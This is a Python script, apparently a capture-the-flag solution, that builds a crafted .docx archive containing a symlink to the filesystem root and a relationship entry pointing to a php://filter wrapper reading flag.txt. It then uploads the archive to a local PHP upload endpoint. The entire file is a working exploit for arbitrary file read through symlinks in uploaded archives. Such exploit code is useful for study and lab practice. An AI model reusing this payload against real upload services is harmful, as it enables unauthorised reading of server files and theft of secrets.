import os
import zipfile
import requests

def ZipDir(inputDir, outputZip):
    '''Zip up a directory and preserve symlinks and empty directories'''
    zipOut = zipfile.ZipFile(outputZip, 'w', compression=zipfile.ZIP_DEFLATED)
    
    rootLen = len(os.path.dirname(inputDir))
    def _ArchiveDirectory(parentDirectory):
        contents = os.listdir(parentDirectory)
        # store empty directories
        if not contents:
            # http://www.velocityreviews.com/forums/t318840-add-empty-directory-using-zipfile.html
            archiveRoot = parentDirectory[rootLen:].replace('\\', '/').lstrip('/')
            zipInfo = zipfile.ZipInfo(archiveRoot+'/')
            zipOut.writestr(zipInfo, '')
        for item in contents:
            fullPath = os.path.join(parentDirectory, item)
            if os.path.isdir(fullPath) and not os.path.islink(fullPath):
                _ArchiveDirectory(fullPath)
            else:
                archiveRoot = fullPath[rootLen:].replace('\\', '/').lstrip('/')
                if os.path.islink(fullPath):
                    # http://www.mail-archive.com/python-list@python.org/msg34223.html
                    zipInfo = zipfile.ZipInfo(archiveRoot)
                    zipInfo.create_system = 3
                    # long type of hex val of '0xA1ED0000L',
                    # say, symlink attr magic...
                    zipInfo.external_attr = 2716663808
                    zipOut.writestr(zipInfo, os.readlink(fullPath))
                else:
                    zipOut.write(fullPath, archiveRoot, zipfile.ZIP_DEFLATED)
    _ArchiveDirectory(inputDir)
    
    zipOut.close()

def pack_payload(zip_filename):
    tmp_dir = "./tmp/"
    word_dir = os.path.join(tmp_dir, "word")
    rels_dir = os.path.join(word_dir, "_rels")
    media_symlink = os.path.join(word_dir, "media")
    os.makedirs(rels_dir, exist_ok=True)

    # Create the document.xml.rels file with user-defined content
    rels_content = """
    <?xml version='1.0' encoding='UTF-8'?>
    <Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
        <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/php://filter/read=zlib.deflate/resource=flag.txt"/>
    </Relationships>
    """.strip()
    
    with open(os.path.join(rels_dir, "document.xml.rels"), "w") as f:
        f.write(rels_content)

    # Create a symlink pointing to root folder
    if not os.path.exists(media_symlink):
        os.symlink("/", media_symlink)

    zip_path = os.path.join(tmp_dir, zip_filename)
    ZipDir(tmp_dir, zip_path)
    return zip_path

def upload_zip(zip_path, url):
    with open(zip_path, 'rb') as f:
        files = {'input': (os.path.basename(zip_path), f, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')}
        response = requests.post(url, files=files)
        print("Status:", response.status_code)
        print("Body:", response.text)

if __name__ == "__main__":
    zip_filename = "output.docx"
    upload_url = "http://localhost:1337/upload.php"  # Change this to your actual endpoint

    zip_path = pack_payload(zip_filename)
    upload_zip(zip_path, upload_url)
